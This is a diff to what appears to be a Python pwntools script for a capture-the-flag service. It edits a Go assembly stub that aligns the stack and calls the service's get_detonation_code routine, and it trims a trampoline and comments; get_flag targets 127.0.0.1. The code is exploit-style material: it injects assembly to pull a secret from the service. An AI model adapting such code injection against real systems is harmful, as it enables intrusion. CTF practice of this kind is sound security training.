@@ -5,20 +5,9 @@ import sys
 
 from pwn import *
 
-CUSTOM_STUB ="""TEXT ·trampoline(SB), 0, $256-16
-    MOVQ f_ptr+0(FP), AX // Load the argument before messing with SP
-    MOVQ SP, BX        // Save SP in a callee-saved registry
-    ADDQ $256, SP      // Rollback SP to reuse this function's frame
-    ANDQ $~15, SP      // Align the stack to 16-bytes
-    CALL AX
-    MOVQ BX, SP        // Restore SP
-    MOVQ AX, ret+8(FP) // Place the return value on the stack
-    RET
-
-
-TEXT ·call_get_flag(SB), 0, $256-8
-    MOVQ SP, BX        // Save SP in a callee-saved registry
-    ANDQ $~15, SP      // Align the stack to 16-bytes
+CUSTOM_STUB ="""TEXT ·custom(SB), 0, $256-8
+    MOVQ SP, BX
+    ANDQ $~15, SP
     ADDQ $32, SP
     MOVQ $0x%s, 0(SP)
     MOVQ $0x%s, 4(SP)
@@ -30,7 +19,7 @@ TEXT ·call_get_flag(SB), 0, $256-8
     ADDQ $8, DX
     MOVQ $8, CX
     CALL get_detonation_code(SB)
-    MOVQ BX, SP        // Restore SP
+    MOVQ BX, SP
     RET
 """
 
@@ -57,5 +46,4 @@ def get_flag(ip, port, flag_id, token):
 
 
 if __name__ == "__main__":
-    print sys.argv
     print get_flag("127.0.0.1", 6666, "AAAABBBB", "CCCCDDDD")
